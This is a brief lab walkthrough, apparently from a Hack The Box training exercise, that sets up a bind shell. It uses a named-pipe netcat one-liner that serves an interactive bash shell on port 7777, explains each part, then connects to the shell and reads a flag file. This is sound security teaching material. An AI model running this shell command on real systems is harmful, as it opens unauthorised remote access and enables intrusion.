## Bind Shells

1. ssh into the target machine.

```
ssh htb-student@$target_ip
```

output:
```
htb-student@ubuntu:~$
```

2. set up a bind shell on the target machine.

```
htb-student@ubuntu:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.201.134 7777 > /tmp/f
```

`rm -f /tmp/f;` - removes an existing `/tmp/f` file, if present. `-f` suppresses errors if it doesn't exist.

`mkfifo /tmp/f;` - creates a named pipe at `/tmp/f` to pass data between processes.

`cat /tmp/f` - reads data coming through the named pipe.

`/bin/bash -i` - starts an interactive bash shell.

`2>&1` - redirects standard error (file descriptor `2`) to standard output (`1`), so both streams can be sent onward.

`nc -l 10.129.201.134 7777` - listen for a connection on port `7777` at the target's ip address.

`> /tmp/f` - 	sends netcat's standard output back into the named pipe.

3. connect to the bind shell listening on the target.

```
nc -nv $target_ip 7777
```

output:
```
(UNKNOWN) [10.129.201.134] 7777 (?) open
htb-student@ubuntu:~$
```

4. read `flag.txt`.

```
htb-student@ubuntu:~$ cat /customscripts/flag.txt
```